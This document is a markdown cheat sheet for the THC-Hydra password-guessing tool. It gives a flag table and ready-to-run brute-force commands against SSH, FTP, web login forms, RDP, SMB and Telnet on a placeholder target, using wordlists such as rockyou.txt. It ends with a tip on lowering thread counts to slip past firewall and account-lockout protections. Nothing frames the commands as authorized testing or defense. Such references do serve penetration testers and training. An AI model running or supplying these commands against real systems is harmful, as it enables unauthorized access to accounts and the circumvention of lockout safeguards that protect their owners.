# Hydra basic commands

Quick reference guide for **THC-Hydra** commands and their use cases.

## Core Flags

| Flag | Description |
| :--- | :--- |
| `-l <user>` | Test a single username. |
| `-L <file>` | Test a list of usernames from a file. |
| `-p <pass>` | Test a single password. |
| `-P <file>` | Test a list of passwords from a file (e.g., `rockyou.txt`). |
| `-s <port>` | Specify a non-standard port. |
| `-v` / `-V` | Enable verbose mode to show login attempts. |
| `-t <tasks>` | Set number of parallel connects (Default: 16). |
| `-f` | Exit as soon as the first valid credential pair is found. |

---

## Common Commands

### 1. SSH
Brute-force SSH password for a specific user.
```bash
hydra -l admin -P passwords.txt <TARGET_IP> ssh
```

### 2. FTP
Brute-force FTP using both user and password lists.
```bash
hydra -L users.txt -P passwords.txt <TARGET_IP> ftp
```

### 3. Web Login Form (HTTP POST)
Target web login forms. Format: `"/URL:inputs:FailedMessage"`.
```bash
hydra -l molly -P rockyou.txt <TARGET_IP> http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect."
```

### 4. Web Login Form (HTTP GET)
Target logins that send credentials via URL parameters.
```bash
hydra -l admin -P passwords.txt <TARGET_IP> http-get-form "/auth.php?user=^USER^&pass=^PASS^:F=Invalid login"
```

### 5. RDP (Remote Desktop)
Brute-force Windows Remote Desktop (low threads recommended for stability).
```bash
hydra -l Administrator -P passwords.txt <TARGET_IP> rdp -t 4
```

### 6. SMB
Brute-force Windows network share logins.
```bash
hydra -l user1 -P passwords.txt <TARGET_IP> smb
```

### 7. Telnet
Brute-force Telnet service credentials.
```bash
hydra -l root -P passwords.txt <TARGET_IP> telnet
```

---

 ### Quick Tips:

**Resume Session:** If a scan is interrupted, resume it using the restore flag:
  ```bash
  hydra -R
  ```
**Rate Limiting Avoidance:** Lower the thread count to bypass basic firewall or account lockout blocks:
  ```bash
  hydra -l admin -P passwords.txt <TARGET_IP> ssh -t 4
  ```


